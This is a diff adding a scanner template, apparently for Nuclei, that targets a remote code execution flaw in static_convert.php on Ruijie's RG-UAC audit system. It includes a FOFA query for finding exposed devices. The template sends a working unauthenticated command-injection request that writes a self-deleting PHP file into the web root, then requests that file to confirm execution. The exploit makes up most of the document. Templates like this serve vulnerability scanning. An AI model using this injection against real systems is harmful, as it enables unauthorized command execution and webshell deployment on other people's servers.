@@ -1,0 +1,34 @@
+id: ruijie-static_convert-RCE
+
+info:
+  name: "锐捷统一上网行为管理与审计系统 static_convert.php 远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="RG-UAC登录页面"
+      锐捷统一上网行为管理与审计系统中的 static_convert.php 接口存在远程代码执行缺陷。攻击者可通过该接口在未认证状态下触发远程代码执行，实现任意命令注入或WebShell部署，从而完全控制目标服务器，造成数据泄露或服务中断等高风险后果。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139883855
+  tags: 锐捷
+
+http:
+- raw:
+  - |
+    GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20print("Unknown");unlink(__FILE__);?>%27%20>/var/www/html/test.php HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /test.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - 'len(body) >= 9 && len(body) <= 10'
+    - 'status_code == 200'
+    - 'contains(body, "Unknown")'
+    condition: and
+
+
+
+
+
+
